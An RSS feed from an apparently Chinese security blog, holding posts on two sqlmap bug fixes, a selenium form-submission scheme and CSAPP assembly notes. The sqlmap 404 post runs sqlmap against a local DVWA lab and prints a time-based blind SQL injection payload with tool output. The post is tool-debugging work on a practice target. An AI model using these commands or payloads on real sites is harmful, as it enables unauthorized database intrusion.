<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Fri, 25 Aug 2017 22:27:06 +0800</pubDate>
    <lastBuildDate>Fri, 25 Aug 2017 22:27:06 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>sqlmap以加载请求文件方式检测https服务器时存在的bug</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;sqlmap在扫描https类型的注入点的时候,当通过使用-r参数加载请求文件来检测有没有sql注入漏洞时,不能较好处理是否用ssl
通信,导致无法通过使用-r参数通过加载请求文件的方式自动检测是否是https协议,并因此无法检测出存在的注入点(需要人工添
加&lt;code class=&quot;highlighter-rouge&quot;&gt;--force-ssl&lt;/code&gt;)&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;1.当requestFile(-r加载的请求文件)中有Referer参数且Referer的值中的hostname部分及port部分与requestFile中的Host参数的值
中的hostname与port部分相同,且Referer的值是https开头,认为这个requestFile的测试应该走ssl(也即走https通信)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg:[requestFile]

POST /xxx/xxx/xxx/x.jsp?x=a HTTP/1.1
Host: www.google.com:6666
...
Referer: https://www.google.com:6666/xxxooo/xxoo/xxx.jsp
...

xx=xxx&amp;amp;ooo=ooo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.当requestFile(-r加载的请求文件)中的port值不为80且requestFile中有Referer参数且Referer的值是&lt;code class=&quot;highlighter-rouge&quot;&gt;https://.*cdn.*&lt;/code&gt;的格式,这种情况也认为要走https通信&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg:[requestFile]

POST /xxx/xxx/xxx/x.jsp?x=a HTTP/1.1
Host: www.google.com:6666
...
Referer: https://www.google-cdn.com/lllllllllllxxoo/xxx.jsp
...

xx=xxx&amp;amp;ooo=ooo
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面这种情况认为测试要走https通信,对应修改sqlmap中的lib/core/option.py中相关代码(&lt;code class=&quot;highlighter-rouge&quot;&gt;lib/core/option.py&lt;/code&gt;),已提交pull request到sqlmap,对应下面的与conf.forceSSL相关的部分代码&lt;br /&gt;
&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/pull/2663&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 23 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/23/sqlmap%E4%BB%A5%E5%8A%A0%E8%BD%BD%E8%AF%B7%E6%B1%82%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%A3%80%E6%B5%8Bhttps%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84bug/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/23/sqlmap%E4%BB%A5%E5%8A%A0%E8%BD%BD%E8%AF%B7%E6%B1%82%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%A3%80%E6%B5%8Bhttps%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E5%AD%98%E5%9C%A8%E7%9A%84bug/</guid>
        
        <category>sqlmap</category>
        
        <category>https</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>selenium自动提交表单方案</title>
        <description>&lt;h3 id=&quot;0x00-refer&quot;&gt;0x00 Refer&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/wang02011/article/details/6299517&quot;&gt;1.常见的提交表单的方法&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/manors/archive/2010/03/11/1683727.html&quot;&gt;2.表单提交规则&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/32779563/how-can-i-click-submit-button&quot;&gt;3.selenium提交表单&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/17530104/selenium-webdriver-submit-vs-click&quot;&gt;4.selenium中click()和submit()的区别&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x01-about&quot;&gt;0x01 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用selenium自动提交表单,要求能适应绝大多数的未知html情况下的提交,以便自动获取页面中的表单中的所有要提交的参
数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-detail&quot;&gt;0x02 Detail&lt;/h3&gt;

&lt;p&gt;1.先判断html中form action所在行能不能通过selenium(通过查找&lt;code class=&quot;highlighter-rouge&quot;&gt;find_element_by_css_selector('form[action=..]')&lt;/code&gt;)找到,不行再看看form这行有没有id或name,再通过id或name找到并用selenium的submit()来提交&lt;/p&gt;

&lt;p&gt;2.如果1失败再找&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input.*type=('|&quot;)?submit('|&quot;)?.*&amp;gt;&lt;/code&gt;的提交按钮,找到后用selenium的click()来提交&lt;/p&gt;

&lt;p&gt;3.如果2失败再找&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input.*type=('|&quot;)?button('|&quot;)?.*onclick=.*&amp;gt;&lt;/code&gt;的通过js提交表单的行中的按钮,找到后用selenium的
click()来提交&lt;/p&gt;

&lt;p&gt;4.目前这样做无法处理用图片提交的表单,后期视情况增加或不加&lt;/p&gt;
</description>
        <pubDate>Mon, 21 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</guid>
        
        <category>python</category>
        
        <category>selenium</category>
        
        <category>form</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>sqlmap对状态码404处理的bug</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;sqlmap对页面遇到404响应码后直接抛出一个异常并退出sqlmap不再进行后续的paylaod测试,在用sqlmap测试sql注入点的时候,一
般用到&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数来节省时间,这种情况下sqlmap有一处对http状态码404的处理不当导致无法测出注入点的bug&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;在爬虫时get请求的url可轻易爬到,但是post请求的url及post的数据的取得需要探测html中有没有表单相关的关键字,并通过表单
来构造post参数的值并提交来获取后续返回内容,如下例中详情:&lt;/p&gt;

&lt;p&gt;安装dvwa设置level=low,测试&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Injection(Blind)&lt;/code&gt;这一项时,参数是通过表单来提交的,点击&lt;code class=&quot;highlighter-rouge&quot;&gt;submit&lt;/code&gt;提交后会将输入框&lt;code class=&quot;highlighter-rouge&quot;&gt;User
ID&lt;/code&gt;中的内容以get请求发送到服务器,例如在文本框中输入1则浏览器将对应访问&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/sqlmap404bug-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;尝试用sqlmap跑出这个注入点,语句如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&quot; --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样是可以跑出来的,但是要提高效率用工具自动发现这个漏洞时,一般这样用sqlmap:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms --batch -v 3 --cookie='...'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由于这里的id参数的值通过爬虫无法获得,因为这个id参数的值是通过表单提交的,爬虫最多可得到的url为:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上图中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Submit&lt;/code&gt;按钮对应的应该是js处理的动作,js将表单通过get请求发送到服务器,这种情况下,需要用selenium+phantomjs
来获得上面的url(或者使用sqlmap中的&lt;code class=&quot;highlighter-rouge&quot;&gt;--forms&lt;/code&gt;参数来捕获这样的表单),而就算得到了url,由于这个url中的&lt;code class=&quot;highlighter-rouge&quot;&gt;id=&lt;/code&gt;,也即id值为空,
这种情况下,sqlmap的&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数的处理是随机赋值给id并测试各种payload(eg,id=1389),然而dvwa中的这个页面在服务器上的
处理并不一般,如果用户提交的id参数在服务器上没有查询到,服务器会响应404状态码(可能一般waf也会这样做),而sqlmap遇到
404状态码,直接就抛出异常并退出了,这样导致无法用sqlmap的&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数测出这个sql注入点&lt;/p&gt;

&lt;p&gt;其实如果用selenium+phantomjs得到了url&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit#&lt;/code&gt;后
如果服务器正常响应查询(这里的dvwa不正常响应,对查不到的统一返回404状态码),用sqlmap是可以检测到这种不带具体值的参数
类型url的注入点的,但是要设置&lt;code class=&quot;highlighter-rouge&quot;&gt;--risk=3&lt;/code&gt;,默认的sqlmap的risk值为1,为1时sqlmap不会测试&lt;code class=&quot;highlighter-rouge&quot;&gt;' or [sqli] and '1'='1&lt;/code&gt;(要测出
不带参数值的参数的注入点则要通过&lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt;来测试),也即要发挥sqlmap的功能最好设置&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch --risk=3 --forms&lt;/code&gt;.试试直接用这种
方法测试上面的注入点(在dvwa中对应的页面为&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/sqlmap [master] » python2 sqlmap.py -u &quot;192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.1.8.6#dev}
|_ -| . [(]     | .'| . |
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 14:40:30

[14:40:30] [DEBUG] cleaning up configuration parameters
[14:40:30] [DEBUG] setting the HTTP timeout
[14:40:30] [DEBUG] setting the HTTP Cookie header
[14:40:30] [DEBUG] creating HTTP requests opener object
[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
[14:40:30] [INFO] testing connection to the target URL
[14:40:30] [DEBUG] declared web page charset 'utf-8'
[14:40:30] [INFO] searching for forms
[14:40:30] [DEBUG] initializing the knowledge base
[#1] form:
GET http://192.168.8.190:80/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit
Cookie: PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low
do you want to test this form? [Y/n/q]
&amp;gt; Y
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
Edit GET data [default: id=&amp;amp;Submit=Submit]: id=&amp;amp;Submit=Submit
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
do you want to fill blank fields with random values? [Y/n] Y
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
[14:40:30] [INFO] resuming back-end DBMS 'mysql'
[14:40:30] [INFO] using '/var/root/.sqlmap/output/results-08202017_0240pm.csv' as the CSV results file in multiple targets mode
[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
[14:40:30] [DEBUG] declared web page charset 'utf-8'
[14:40:30] [CRITICAL] page not found (404)
[14:40:30] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[14:40:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/var/root/.sqlmap/output/results-08202017_0240pm.csv'

[*] shutting down at 14:40:30
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发现sqlmap跑不出来,尝试修改sqlmap代码,结果中有关键字&lt;code class=&quot;highlighter-rouge&quot;&gt;page not found (404)&lt;/code&gt;,于是定位相关代码:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp/sqlmap &amp;amp;&amp;amp; grep -r &quot;page not found&quot; .
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;结果如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./lib/request/connect.py:                    errMsg = &quot;page not found (%d)&quot; % code
./lib/request/connect.py:                    debugMsg = &quot;page not found (%d)&quot; % code
./lib/utils/crawler.py:                    if &quot;page not found&quot; in getSafeExString(ex):
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;于是修改./lib/request/connect.py中代码:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elif ex.code == httplib.NOT_FOUND:
    if raise404:
        errMsg = &quot;page not found (%d)&quot; % code
        raise SqlmapConnectionException(errMsg)
    else:
        debugMsg = &quot;page not found (%d)&quot; % code
        singleTimeLogMessage(debugMsg, logging.DEBUG)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;将其中的raise SqlmapConnectionException(errMsg)注释掉后再重新用刚才的sqlmap语句测试可测出这个注入点,详情如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/sqlmap [master●] » python2 sqlmap.py -u &quot;192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
[14:48:41] [DEBUG] checking for filtered characters
[14:48:41] [PAYLOAD] OOFt' OR 6597=IF((3988&amp;gt;3987),SLEEP(5),6597) AND 'sIjt'='sIjt
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[14:49:06] [DEBUG] used the default behaviour, running in batch mode
sqlmap identified the following injection point(s) with a total of 146 HTTP(s) requests:
    ---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 OR time-based blind
    Payload: id=OOFt' OR SLEEP(5) AND 'CaKs'='CaKs&amp;amp;Submit=Submit
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
    ---
do you want to exploit this SQL injection? [Y/n] Y
[14:49:06] [DEBUG] used the default behaviour, running in batch mode
[14:49:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.25
back-end DBMS: MySQL &amp;gt;= 5.0.12
[14:49:06] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 131 times
[14:49:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file
'/var/root/.sqlmap/output/results-08202017_0246pm.csv'

[*] shutting down at 14:49:06
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;已提交pull request到sqlmap,相关代码文件为&lt;code class=&quot;highlighter-rouge&quot;&gt;lib/request/connect.py&lt;/code&gt;,&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/pull/2663&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 20 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/20/sqlmap%E5%AF%B9%E7%8A%B6%E6%80%81%E7%A0%81404%E5%A4%84%E7%90%86%E7%9A%84bug/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/20/sqlmap%E5%AF%B9%E7%8A%B6%E6%80%81%E7%A0%81404%E5%A4%84%E7%90%86%E7%9A%84bug/</guid>
        
        <category>sqlmap</category>
        
        <category>python</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第3章笔记</title>
        <description>&lt;p&gt;1.编译器驱动程序将源文件翻译成可执行目标文件可分为4个阶段完成&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S hello.c&lt;/code&gt;中:gcc也可用cc缩写代替,-O1表示编译器优化级别,-S表示生成汇编代码,结果为hello.s[汇编]
b.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -c hello.c&lt;/code&gt;:gcc会编译并汇编,得到hello.o,hello.o是二进制格式,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello.o&lt;/code&gt;查看汇编格式内容
c.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -o hello hello.o main.c&lt;/code&gt;:可由gcc产生可执行文件hello,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello&lt;/code&gt;反汇编hello这个可执行文件[反汇编]
d.上面a中的汇编过程默认得到的为ATT格式的汇编代码,要得到intel格式的指令为:&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S -masm=intel hello.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;2.gcc生成的汇编指令都有一个字符后缀,表明操作数的大小,movb表示传送字节(eg,对应al/ah),movw表示传送字(eg,对应ax/bx),
movl表示传送双字(eg,对应eax/ebx)&lt;/p&gt;

&lt;p&gt;3.mov指令有个限制,传送指令的两个操作数不能都指向存储器位置.eg,mov [0x1000],[0x2000]是不允许的,需要mov eax,[0x1000]先,再mov [0x2000],eax&lt;/p&gt;

&lt;p&gt;4.movs和movz都是将一个较小的数据复制到一个较大的数据位置,高位用符号位扩展(movs)或者用零位扩展(movz)进行填充&lt;/p&gt;

&lt;p&gt;5.movsbl:将b符号扩展(s)成l格式后再mov到l,movzwl:将w零扩展(z)成l后再mov到l,eg:假设%dh=CD(1100 1101),%eax=98765432&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;movb %dh,%al        %al=%dh=CD,%eax=987654CD
movsbl %dh,%eax     sbl:%dh-&amp;gt;FFFFCD,%eax=FFFFCD
movzbl %dh,%eax     zbl:%dh-&amp;gt;0000CD,%eax=0000CD
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;6.左移右移汇编指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sal:算术左移
shl:逻辑左移
sar:算术右移
shr:逻辑右移
sal=shl,只有算术右移(sar)操作要求区分有符号和无符号操作数,shr在高位补0,sal和shl在低位补0,这个特性使得补码运算
成为实现有符号整数运算的一种比较好的方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7.c/c++中的goto与汇编中的jmp addr等同,条件数据传送指令比条件控制转移的性能好&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;条件数据传送,eg:
cmp %edx,%ecx
cmovl %ebx,%eax(此处的l代表less,不是att中的movl中的long)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;8.leave+ret恢复栈的状态到调用函数前&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leave=mov esp,ebp+pop ebp[执行pop ebp后此时esp指向的是old_eip]
retn n==pop eip+mov esp,esp+4*n+jmp eip

(栈中大地址)
参数n
...
参数1
old_eip     &amp;lt;--对应--&amp;gt;      push old_eip
old_ebp     &amp;lt;--对应--&amp;gt;      push ebp+mov ebp
被保存的寄存器,本地变量和临时变量
(栈中小地地)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;9.寄存器使用惯例&lt;/p&gt;

&lt;p&gt;a)eax,edx,ecx被划分为&lt;code class=&quot;highlighter-rouge&quot;&gt;调用者保存&lt;/code&gt;寄存器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;过程p调用q时,q可以覆盖这些寄存器,而不会破坏任何p所需要的数据
也即调用者在调用其它函数前会自行保存这些寄存器在调用者的栈桢中,调用完成后会恢复(pop)这些保存过的寄存器
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;b)ebx,esi,edi被划分为&lt;code class=&quot;highlighter-rouge&quot;&gt;被调用者保存&lt;/code&gt;寄存器&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;q必须在覆盖这些寄存器的值之前,先把它们保存到栈中,并在返回前恢复
也即被调用者在返回到调用者的栈桢中前会在当前被调用者自己的栈桢中保存这些寄存器,并在返回前恢复(pop)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;10.被调用的函数的参数在被调用的函数当前栈桢中的位置如下,其中ebp是被调用函数当前栈桢中的ebp,old_eip是在调用被调用
函数的调用函数中的call xxx(xxx表示被调用函数的名称)所在汇编语句的下一句汇编语句的内存地址&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;old_eip:ebp+0x4
第1个参数:ebp+0x8
第2个参数:ebp+0xc
第n个参数:ebp+0x4(n+1)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;11.c语言允许对指针进行运算,而计算出来的值会根据该值引用的数据类型的大小进行伸缩,也就是说,如果p是一个指向类型为T的
数据的指针,p的值为&lt;script type=&quot;math/tex&quot;&gt;X{i}&lt;/script&gt;,那么表达式p+i的值为&lt;script type=&quot;math/tex&quot;&gt;X{p}+l\ast i&lt;/script&gt;,这里l是数据类型t的大小&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

    int iV=3;
    void* a=&amp;amp;iV;
    printf(&quot;a:%p&quot;,a);
    void *b=a+1;
    void *c=a-1;
    printf(&quot;\n&quot;);
    printf(&quot;b=a+1:%p&quot;,b);
    printf(&quot;\n&quot;);
    printf(&quot;c=a-1:%p&quot;,c);
    printf(&quot;\n&quot;);
    printf(&quot;b-a:%p&quot;,b-a);

    return 0;

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面运行结果为&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:0x7fff508f85c8
b=a+1:0x7fff508f85c9
c=a-1:0x7fff508f85c7
b-a:0x1#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;将其中的&lt;code class=&quot;highlighter-rouge&quot;&gt;void *&lt;/code&gt;换成&lt;code class=&quot;highlighter-rouge&quot;&gt;int *&lt;/code&gt;后代码如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

    int iV=3;
    int* a=&amp;amp;iV;
    printf(&quot;a:%p&quot;,a);
    int *b=a+1;
    int *c=a-1;
    printf(&quot;\n&quot;);
    printf(&quot;b=a+1:%p&quot;,b);
    printf(&quot;\n&quot;);
    printf(&quot;c=a-1:%p&quot;,c);
    printf(&quot;\n&quot;);
    printf(&quot;b-a:%p&quot;,b-a);

    return 0;

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行结果变成如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:0x7fff506ab5c8
b=a+1:0x7fff506ab5cc
c=a-1:0x7fff506ab5c4
b-a:0x1#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;12.类似于数组的实现,结构的所有组成部分都存放在存储器中一段连续的区域内,python中没有结构体,可用类来代替&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class mystruct:

    def __init__(self):
        self.name=&quot;&quot;
        self.size=10
        self.list=[]

a=mystruct()
a.name='cup'
a.size=8
a.list.append('water')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;13.一个联合(union类型)的总的大小等于它最大字段的大小,联合中的每个元素的偏移都是0&lt;/p&gt;

&lt;p&gt;14.DDD是GDB的一个扩展,提供了图形界面,据说功能强大&lt;a href=&quot;http://blog.csdn.net/yangzm/article/details/51793023&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;15.x86-64下寄存器比IA32的寄存器:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;寄存器数量翻倍至16个,新增加的寄存器命名为%r8-%r15
可直接访问每个寄存器的低32位(%eax,%ecx,%edx...,%r8d-%r15d)
可直接访问每个寄存器的低16位(%ax,%cx,%dx...,%r8w-%r15w)
可直接访问每个寄存器的低8位
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;16.x86-64与栈相关的特性&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)将函数参数保存在寄存器上,不保存在栈上(参数&amp;gt;6个除外)
b)程序不再需要信赖栈来存储和获取过程信息,极大地减少了过程调用和返回的开销
c)最多可以有6个整型(整数和指针)参数可以通过寄存器进行传递,寄存器名对应于所传递的数据的大小,如下图
d)在调用过程中,栈指针保存在固定的位置(rsp),使得可以用相对于栈指针的偏移量来访问数据,因此不再需要栈底指针(ebp)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;e)使得函数可能需要栈帧的原因如下:
    1)局部变量大多,不能都放在寄存器中
    2)有些局部变量是数组或是结构
    3)函数用取地址操作符(&amp;amp;)来计算一个局部变量的地址
    4)函数必须将栈上的某些参数传递到另一个函数
    5)在修改一个被调用者保存的寄存器前,函数需要保存它的状态
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 16 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
